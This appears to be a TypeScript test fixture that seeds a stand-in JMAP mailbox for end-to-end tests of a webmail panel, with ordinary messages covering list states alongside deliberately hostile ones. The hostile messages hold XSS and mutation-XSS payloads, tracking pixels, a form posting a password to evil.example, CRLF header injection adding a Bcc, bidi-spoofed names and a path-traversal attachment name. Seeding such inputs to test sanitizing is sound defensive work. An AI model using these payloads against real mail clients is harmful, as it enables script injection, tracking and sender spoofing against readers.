/**
 * The mailbox the stand-in JMAP serves: the folders and the messages in them,
 * hostile ones included. Each hostile message is a real payload of a kind that
 * has run script, tracked a reader or confused one in some mail client, so the
 * end-to-end checks read the panel's answer to it and not to a polite sample.
 */

export interface Addr {
	name: string | null;
	email: string;
}

export interface SeedAttachment {
	name: string;
	type: string;
	content: string;
	disposition?: "attachment" | "inline";
}

export interface SeedMessage {
	id: string;
	mailbox: string;
	receivedAt: string;
	subject: string;
	from: Addr[];
	to: Addr[];
	cc?: Addr[];
	bcc?: Addr[];
	keywords: Record<string, boolean>;
	text?: string;
	html?: string;
	attachments?: SeedAttachment[];
}

/** The mailboxes, in the shape `Mailbox/get` lists them. */
export const MAILBOXES = [
	{ id: "INBOX", name: "INBOX", parentId: null, role: "inbox" },
	{ id: "Drafts", name: "Drafts", parentId: null, role: "drafts" },
	{ id: "Sent", name: "Sent", parentId: null, role: "sent" },
	{ id: "Archive", name: "Archive", parentId: null, role: "archive" },
	{ id: "Junk", name: "Junk", parentId: null, role: "junk" },
	{ id: "Trash", name: "Trash", parentId: null, role: "trash" },
	{ id: "Work", name: "Work", parentId: null, role: null },
	{ id: "Work/Q4", name: "Q4", parentId: "Work", role: null },
] as const;

/** A UUID the stand-in gives to its n-th seeded message. */
export function seedId(n: number): string {
	return `00000000-0000-4000-8000-${n.toString(16).padStart(12, "0")}`;
}

const ME: Addr = { name: null, email: "admin@example.test" };
const ANA: Addr = { name: "Ana Pérez", email: "ana@example.org" };

/** Named ids, so a scenario can open each message. */
export const IDS = {
	welcome: seedId(1),
	newsletter: seedId(2),
	hostileHtml: seedId(3),
	hostileHeaders: seedId(4),
	attachments: seedId(5),
	mxss: seedId(6),
	textOnly: seedId(7),
	flagged: seedId(8),
	archived: seedId(9),
	stateEverything: seedId(20),
	stateNew: seedId(21),
	stateAnswered: seedId(22),
	stateForwarded: seedId(23),
	stateImportantStarred: seedId(24),
	stateForeignKeywords: seedId(25),
	stateRightToLeft: seedId(26),
	stateBare: seedId(27),
	stateManyLabels: seedId(28),
	stateLastYear: seedId(29),
} as const;

/** `days` days before now at `hour` UTC, so the list always has a message of today, of yesterday and of this week. */
function daysAgo(days: number, hour: number, minute = 0): string {
	const now = new Date();
	return new Date(Date.UTC(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate() - days, hour, minute))
		.toISOString()
		.replace(".000Z", "Z");
}

/**
 * One message in every state a row of the list can show, alone and combined,
 * so each can be looked at and none is taken on faith. A label is a keyword
 * (`To_20do` is "To do", see the panel's `keyword-codec`); `$Important` and
 * `$Forwarded` are spelled as an IMAP client sets them and `$important` as
 * JMAP does, since the server keeps the case it was given.
 */
function stateMessages(): SeedMessage[] {
	return [
		{
			id: IDS.stateEverything,
			mailbox: "INBOX",
			receivedAt: daysAgo(0, 0, 2),
			subject: "Contract for signature, final version with the changes agreed on Tuesday",
			from: [{ name: "Maximiliano Fernández de Córdoba y Villavicencio", email: "maximiliano.fernandez@a-rather-long-domain.example.org" }],
			to: [ME],
			keywords: { $important: true, $flagged: true, Work: true, To_20do: true },
			text: "Unread, important, starred, two labels and an attachment.",
			attachments: [{ name: "contract.pdf", type: "application/pdf", content: "%PDF-1.4 stand-in" }],
		},
		{
			id: IDS.stateNew,
			mailbox: "INBOX",
			receivedAt: daysAgo(0, 0, 1),
			subject: "Lunch on Friday?",
			from: [{ name: "Bo Larsen", email: "bo@example.org" }],
			to: [ME],
			keywords: {},
			text: "Unread and nothing else.",
		},
		{
			id: IDS.stateAnswered,
			mailbox: "INBOX",
			receivedAt: daysAgo(0, 0),
			subject: "Budget review",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true, $answered: true, Work: true },
			text: "Read and answered.",
		},
		{
			id: IDS.stateForwarded,
			mailbox: "INBOX",
			receivedAt: daysAgo(1, 15),
			subject: "Minutes of the board meeting",
			from: [{ name: "Chidi Okafor", email: "chidi@example.org" }],
			to: [ME],
			keywords: { $seen: true, $Forwarded: true, A_C3_B1o_20nuevo: true },
			text: "Read and forwarded, with a label whose name has an accent and a space.",
		},
		{
			id: IDS.stateImportantStarred,
			mailbox: "INBOX",
			receivedAt: daysAgo(1, 9),
			subject: "Server certificate expires in 7 days",
			from: [{ name: "Operations", email: "ops@example.org" }],
			to: [ME],
			keywords: { $Important: true, $flagged: true },
			text: "Unread, starred, and marked important by an IMAP client.",
		},
		{
			id: IDS.stateForeignKeywords,
			mailbox: "INBOX",
			receivedAt: daysAgo(3, 12),
			subject: "Keywords another client set",
			from: [ANA],
			to: [ME],
			// The first is not written the panel's way, the second would read as a right-to-left override, the rest belong to the protocol.
			keywords: { $seen: true, Work_items: true, exe_E2_80_AEgpj: true, $label1: true, NonJunk: true, $MDNSent: true },
			text: "Two labels shown as the keyword itself, and three keywords that are not labels.",
		},
		{
			id: IDS.stateRightToLeft,
			mailbox: "INBOX",
			receivedAt: daysAgo(4, 12),
			subject: "مرحبا، هذا موضوع الرسالة (draft 2)",
			from: [{ name: "ليلى حسن", email: "layla@example.org" }],
			to: [ME],
			keywords: { _F0_9F_94_A5_20urgent: true },
			text: "A sender and a subject in a right-to-left script, and a label with an emoji.",
		},
		{
			id: IDS.stateBare,
			mailbox: "INBOX",
			receivedAt: daysAgo(5, 12),
			subject: "",
			from: [{ name: null, email: "no-name@example.org" }],
			to: [ME],
			keywords: {},
			text: "",
		},
		{
			id: IDS.stateManyLabels,
			mailbox: "INBOX",
			receivedAt: daysAgo(20, 12),
			subject: "A message with more labels than a row has room for",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true, Work: true, To_20do: true, Personal: true, Invoices: true, Travel: true, Later: true },
			text: "Six labels.",
			attachments: [{ name: "notes.txt", type: "text/plain", content: "notes" }],
		},
		{
			id: IDS.stateLastYear,
			mailbox: "INBOX",
			receivedAt: daysAgo(400, 12),
			subject: "From more than a year ago",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true, $flagged: true },
			text: "Old enough to sit under another year.",
		},
	];
}

/** Every attachment name and type below tries to be run, or to be a path, when it is saved. */
const ATTACHMENTS: SeedAttachment[] = [
	{ name: "report.pdf", type: "application/pdf", content: "%PDF-1.4 stand-in" },
	{
		name: "../../etc/cron.d/evil‮gpj.exe",
		type: "text/html",
		content: "<script>alert('attachment')</script>",
	},
	{
		name: "logo.svg",
		type: "image/svg+xml",
		content: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
	},
];

const HOSTILE_HTML = [
	"<p>Hello</p>",
	"<script>document.title='pwned-script'</script>",
	'<svg onload="document.title=\'pwned-svg\'"><circle r="5"/></svg>',
	'<div style="background:url(https://tracker.example/css.gif)">styled</div>',
	"<style>body{background:url(https://tracker.example/style.gif)}</style>",
	'<meta http-equiv="refresh" content="0;url=https://evil.example/">',
	'<base href="https://evil.example/">',
	'<a href="javascript:document.title=\'pwned-link\'">js link</a>',
	'<a href="https://example.org/ok">safe link</a>',
	'<img src="https://tracker.example/pixel.gif" alt="remote picture" onerror="document.title=\'pwned-img\'">',
	'<iframe src="https://evil.example/"></iframe>',
	'<form action="https://evil.example/steal"><input name="pw"></form>',
	"<p onclick=\"document.title='pwned-click'\">click me</p>",
].join("\n");

const MXSS_HTML = [
	'<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
	'<noscript><p title="</noscript><img src=x onerror=alert(2)>">',
	"<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(3)>",
].join("\n");

/** The messages the mailbox holds at the start. */
export function seedMessages(): SeedMessage[] {
	const messages: SeedMessage[] = [
		{
			id: IDS.welcome,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T09:00:00Z",
			subject: "Welcome to your mailbox",
			from: [ANA],
			to: [ME],
			keywords: {},
			text: "Hello,\n\nThis is the first message.\n\nAna",
		},
		{
			id: IDS.newsletter,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T08:30:00Z",
			subject: "Weekly newsletter",
			from: [{ name: "News Bot", email: "news@example.org" }],
			to: [ME],
			keywords: { $seen: true },
			text: "Newsletter, plain version.",
			html: '<h1>Weekly newsletter</h1><p>Read <a href="https://example.org/news">the news</a>.</p><img src="https://tracker.example/open.gif?u=1" alt="header"><img src="https://tracker.example/second.gif">',
		},
		{
			id: IDS.hostileHtml,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T08:00:00Z",
			subject: "Hostile HTML body",
			from: [{ name: "Mallory", email: "mallory@example.org" }],
			to: [ME],
			keywords: {},
			html: HOSTILE_HTML,
		},
		{
			id: IDS.hostileHeaders,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T07:30:00Z",
			subject: "Invoice‮txt.exe\r\nBcc: attacker@example.org",
			from: [{ name: "Boss‮⁦ <ceo@example.org>", email: "mallory@example.org" }],
			to: [ME],
			cc: [{ name: "a\r\nX-Injected: yes", email: "cc@example.org" }],
			keywords: { $flagged: true },
			text: "Headers with line breaks and bidi controls.",
		},
		{
			id: IDS.attachments,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T07:00:00Z",
			subject: "Files you asked for",
			from: [ANA],
			to: [ME],
			keywords: {},
			text: "See the attachments.",
			attachments: ATTACHMENTS,
		},
		{
			id: IDS.mxss,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T06:30:00Z",
			subject: "Mutation payloads",
			from: [{ name: "Mallory", email: "mallory@example.org" }],
			to: [ME],
			keywords: {},
			html: MXSS_HTML,
		},
		{
			id: IDS.textOnly,
			mailbox: "INBOX",
			receivedAt: "2026-11-12T06:00:00Z",
			subject: "Markup in plain text",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true },
			text: "<script>alert('text')</script> and <b>not bold</b>",
		},
		{
			id: IDS.flagged,
			mailbox: "INBOX",
			receivedAt: "2026-11-11T12:00:00Z",
			subject: "Starred and answered",
			from: [ANA],
			to: [ME],
			keywords: { $flagged: true, $answered: true, $seen: true },
			text: "Remember this one.",
		},
		{
			id: IDS.archived,
			mailbox: "Archive",
			receivedAt: "2026-10-01T12:00:00Z",
			subject: "Old thread",
			from: [ANA],
			to: [ME],
			keywords: { $seen: true },
			text: "Archived.",
		},
	];
	for (let n = 0; n < 60; n++) {
		messages.push({
			id: seedId(100 + n),
			mailbox: "INBOX",
			receivedAt: new Date(Date.UTC(2026, 10, 10, 12, 0) - n * 3_600_000).toISOString().replace(".000Z", "Z"),
			subject: `Bulk message ${n + 1}`,
			from: [{ name: `Sender ${n + 1}`, email: `sender${n + 1}@example.org` }],
			to: [ME],
			keywords: n % 3 === 0 ? {} : { $seen: true },
			text: `Body of bulk message ${n + 1}.`,
		});
	}
	return [...messages, ...stateMessages()];
}
